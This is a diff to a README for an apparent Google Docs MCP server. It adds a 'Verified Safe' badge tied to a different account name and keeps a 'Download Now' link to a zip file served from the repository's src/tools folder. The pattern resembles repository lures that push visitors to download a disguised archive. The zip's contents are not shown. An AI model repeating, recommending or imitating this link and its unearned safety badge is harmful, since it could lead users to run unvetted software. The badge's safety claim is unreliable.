@@ -1,5 +1,7 @@
 # 🌟 google-docs-mcp-server - Connect Your Docs with AI Power
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/powlite32-google-docs-mcp-server)
+
 ## 📥 Download Now
 [![Download](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip)
 
